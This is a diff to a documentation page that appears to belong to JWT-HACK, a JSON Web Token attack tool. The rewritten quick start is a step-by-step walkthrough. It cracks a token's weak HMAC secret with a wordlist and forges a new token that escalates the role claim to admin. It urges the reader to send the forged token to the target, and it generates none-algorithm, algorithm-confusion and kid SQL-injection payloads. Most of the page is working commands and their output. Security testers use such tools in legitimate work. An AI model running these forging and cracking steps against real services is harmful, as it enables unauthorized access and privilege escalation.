@@ -4,52 +4,95 @@ title = "Quick Start"
 weight = 3
 +++
 
-Get up and running with JWT-HACK in minutes with these basic examples.
+This walkthrough takes one token from "what is this?" to "I can sign my own". It uses the sample wordlist in the repo, so clone it or grab [`samples/wordlist.txt`](https://github.com/hahwul/jwt-hack/blob/main/samples/wordlist.txt) first.
 
-## Basic Usage
+The target token:
 
-### Decode a JWT Token
-
-Decode a JWT to see its header and payload:
-
-```bash
-jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA
+```text
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.D_n2MSe6B7KiG1sfhn_U7x4s3HPEYo-uisUj4DQBEOc
 ```
 
-### Encode a JWT Token
-
-Create a new JWT with a payload and secret:
+## 1. Read it
 
 ```bash
-jwt-hack encode '{"sub":"1234", "name":"test user"}' --secret=mysecret
+jwt-hack decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.D_n2MSe6B7KiG1sfhn_U7x4s3HPEYo-uisUj4DQBEOc
 ```
 
-### Verify a JWT Token
+```text
+▎ Payload
+  {
+    "sub": "1234",
+    "role": "user"
+  }
+```
 
-Verify a JWT's signature with a secret:
+HS256 with a `role` claim. If the secret is weak, you can change `role` and re-sign.
+
+## 2. Scan it
 
 ```bash
-jwt-hack verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA --secret=test
+jwt-hack scan <TOKEN> --skip-payloads
 ```
 
-### Crack a JWT Secret
+`scan` runs every check in one go. The interesting line:
 
-Try to crack a JWT's secret using a wordlist:
+```text
+  ▲ CRIT  Weak Secret            Uses weak secret: 'test'
+```
+
+## 3. Crack it properly
+
+The scanner only tries a short built-in list. For a real engagement, point `crack` at a wordlist:
 
 ```bash
-jwt-hack crack -w wordlist.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.INVALID_SIGNATURE
+jwt-hack crack -w samples/wordlist.txt <TOKEN>
 ```
 
-### Generate Attack Payloads
+```text
+✓ Secret found
 
-Generate various attack payloads for security testing:
+  Secret        test
+```
+
+No wordlist handy? `-p 3` downloads and caches a list of known JWT secrets. See [crack](/usage/commands/crack/) for presets and brute force.
+
+## 4. Forge a new token
+
+Re-sign the payload with `role` set to `admin`:
 
 ```bash
-jwt-hack payload eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.INVALID_SIGNATURE --target=none
+jwt-hack encode '{"sub":"1234","role":"admin"}' --secret=test
 ```
 
-## Next Steps
+```text
+▎ Token
+  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.N25cQtIDZAGWfnifZeT4MF79lzvCgkwp9V_uPldhg7U
+```
 
-- Explore the [Usage Guide](/usage/commands/decode) for detailed command explanations
-- Learn about [Advanced Features](/usage/configuration) and configuration options
-- Check out the [Contributing Guide](/support/contributing) if you want to help improve JWT-HACK
+## 5. Confirm it verifies
+
+```bash
+jwt-hack verify <FORGED_TOKEN> --secret=test
+```
+
+```text
+✓ Token is valid.
+```
+
+Send it to the target and see what the `admin` role unlocks.
+
+## When the secret doesn't crack
+
+A strong secret doesn't mean the token is safe. Next, try the server's parsing and key handling:
+
+```bash
+jwt-hack payload <TOKEN> --target none,alg_confusion,kid_sql
+```
+
+Each payload targets a different implementation bug. [payload](/usage/commands/payload/) explains what each one tests.
+
+## Where to go next
+
+- [Commands](/usage/commands/): every command and flag
+- [Examples](/usage/examples/): recipes for common engagement scenarios
+- [Scripting & Automation](/advanced/scripting-automation/): `--json` output for pipelines
